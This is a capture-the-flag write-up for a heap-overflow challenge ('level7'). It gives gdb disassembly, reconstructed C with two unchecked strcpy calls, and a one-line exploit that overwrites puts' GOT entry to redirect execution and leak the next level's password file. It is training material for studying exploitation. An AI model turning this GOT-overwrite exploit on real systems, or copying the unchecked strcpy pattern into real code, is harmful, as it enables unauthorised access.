## Level7 - Heap Overflows & Structure Tampering
---

### Steps to solve
- #### Use gdb to get the assembly of the program and tracking instructions.
- #### analyse the instructions searsh about call functions or operations.
    - #### Used founctions in this programme.
        ```c
            (gdb) info functions
            All defined functions:

            Non-debugging symbols:
            0x080483b0  printf
            0x080483c0  fgets
            0x080483d0  time
            0x080483e0  strcpy
            0x080483f0  malloc
            0x08048400  puts
            0x08048430  fopen
            0x080484f4  m
            0x08048521  main
        ```
    - #### Assembly code of main:
        ```c
            0x08048524 <+3>:     and    $0xfffffff0,%esp
            0x08048527 <+6>:     sub    $0x20,%esp
            0x0804852a <+9>:     movl   $0x8,(%esp)
            0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
            0x08048536 <+21>:    mov    %eax,0x1c(%esp)
            0x0804853a <+25>:    mov    0x1c(%esp),%eax
            0x0804853e <+29>:    movl   $0x1,(%eax)
            0x08048544 <+35>:    movl   $0x8,(%esp)
            0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
            0x08048550 <+47>:    mov    %eax,%edx
            0x08048552 <+49>:    mov    0x1c(%esp),%eax
            0x08048556 <+53>:    mov    %edx,0x4(%eax)
            0x08048559 <+56>:    movl   $0x8,(%esp)
            0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
            0x08048565 <+68>:    mov    %eax,0x18(%esp)
            0x08048569 <+72>:    mov    0x18(%esp),%eax
            0x0804856d <+76>:    movl   $0x2,(%eax)
            0x08048573 <+82>:    movl   $0x8,(%esp)
            0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
            0x0804857f <+94>:    mov    %eax,%edx
            0x08048581 <+96>:    mov    0x18(%esp),%eax
            0x08048585 <+100>:   mov    %edx,0x4(%eax)
            0x08048588 <+103>:   mov    0xc(%ebp),%eax
            0x0804858b <+106>:   add    $0x4,%eax
            0x0804858e <+109>:   mov    (%eax),%eax
            0x08048590 <+111>:   mov    %eax,%edx
            0x08048592 <+113>:   mov    0x1c(%esp),%eax
            0x08048596 <+117>:   mov    0x4(%eax),%eax
            0x08048599 <+120>:   mov    %edx,0x4(%esp)
            0x0804859d <+124>:   mov    %eax,(%esp)
            0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
            0x080485a5 <+132>:   mov    0xc(%ebp),%eax
            0x080485a8 <+135>:   add    $0x8,%eax
            0x080485ab <+138>:   mov    (%eax),%eax
            0x080485ad <+140>:   mov    %eax,%edx
            0x080485af <+142>:   mov    0x18(%esp),%eax
            0x080485b3 <+146>:   mov    0x4(%eax),%eax
            0x080485b6 <+149>:   mov    %edx,0x4(%esp)
            0x080485ba <+153>:   mov    %eax,(%esp)
            0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
            0x080485c2 <+161>:   mov    $0x80486e9,%edx
            0x080485c7 <+166>:   mov    $0x80486eb,%eax
            0x080485cc <+171>:   mov    %edx,0x4(%esp)
            0x080485d0 <+175>:   mov    %eax,(%esp)
            0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
            0x080485d8 <+183>:   mov    %eax,0x8(%esp)
            0x080485dc <+187>:   movl   $0x44,0x4(%esp)
            0x080485e4 <+195>:   movl   $0x8049960,(%esp)
            0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
            0x080485f0 <+207>:   movl   $0x8048703,(%esp)
            0x080485f7 <+214>:   call   0x8048400 <puts@plt>
            0x080485fc <+219>:   mov    $0x0,%eax
            0x08048601 <+224>:   leave  
            0x08048602 <+225>:   ret
        ```
    - #### Assembly code of m:
        ```c
            0x080484f7 <+3>:     sub    $0x18,%esp
            0x080484fa <+6>:     movl   $0x0,(%esp)
            0x08048501 <+13>:    call   0x80483d0 <time@plt>
            0x08048506 <+18>:    mov    $0x80486e0,%edx
            0x0804850b <+23>:    mov    %eax,0x8(%esp)
            0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
            0x08048517 <+35>:    mov    %edx,(%esp)
            0x0804851a <+38>:    call   0x80483b0 <printf@plt>
            0x0804851f <+43>:    leave  
            0x08048520 <+44>:    ret 
        ```

- #### Get the approximate source code.
    ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <time.h>

        struct node {
            int id;
            char *buffer;
        };

        void m() {
            // 0x8049960 is where fgets stored the flag from the file
            printf("%s - %d\n", (char *)0x8049960, time(NULL));
        }

        int main(int argc, char **argv) {
            // Allocation 1 & 2 (First Node Structure)
            struct node *n1 = malloc(8);       // stored at 0x1c(%esp)
            n1->id = 1;
            n1->buffer = malloc(8);            // n1->buffer is assigned here
            
            // Allocation 3 & 4 (Second Node Structure)
            struct node *n2 = malloc(8);       // stored at 0x18(%esp)
            n2->id = 2;
            n2->buffer = malloc(8);            // n2->buffer is assigned here
            
            // Vulnerability 1: Overflows n1->buffer and destroys n2's headers or pointers
            strcpy(n1->buffer, argv[1]); 
            
            // Vulnerability 2: Overflows n2->buffer
            strcpy(n2->buffer, argv[2]);
            
            // Opens password file and stores it at global address 0x8049960
            FILE *f = fopen("/home/user/level8/.pass", "r");
            fgets((char *)0x8049960, 68, f);
            
            puts("~~"); // address of puts in GOT: 08049928 => \x28\x99\x04\x08
            return 0;
            // address of m: 0x080484f4 \xf4\x84\x04\x08
        }

    ```
- #### Detect the vulnrability type, which is Heap Buffer Overflow. 
- #### solution command 
    ```sh
        ./level7 $(python -c 'print("a"*20+"\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
    ```